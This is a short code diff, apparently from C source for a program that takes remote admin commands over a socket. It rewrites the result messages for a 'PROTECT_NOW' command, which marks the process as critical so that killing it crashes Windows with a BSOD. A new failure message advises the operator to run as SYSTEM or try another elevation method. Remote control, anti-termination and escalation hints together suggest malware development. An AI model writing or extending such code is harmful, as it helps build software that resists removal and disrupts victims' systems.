@@ -155,14 +155,16 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "PROTECT_NOW") == 0) {
         if (!sys_is_admin()) {
-            result = "[Cannot protect: not running as administrator]";
+            result = "[FAIL: not running as administrator]";
         } else {
             sys_protect_process();
             const char *status = sys_protection_status();
             if (strcmp(status, "CRITICAL") == 0) {
-                result = "[Process is now CRITICAL — ending it will cause BSOD]";
+                result = "[SUCCESS: Process is now CRITICAL — ending it will cause BSOD]";
+            } else if (strcmp(status, "FAILED") == 0) {
+                result = "[FAIL: NtSetInformationProcess failed — likely missing SeDebugPrivilege. Try running as SYSTEM or use a different elevation method.]";
             } else {
-                result = "[Protection failed — check admin privileges]";
+                result = "[UNKNOWN: protection status unclear]";
             }
         }
     }
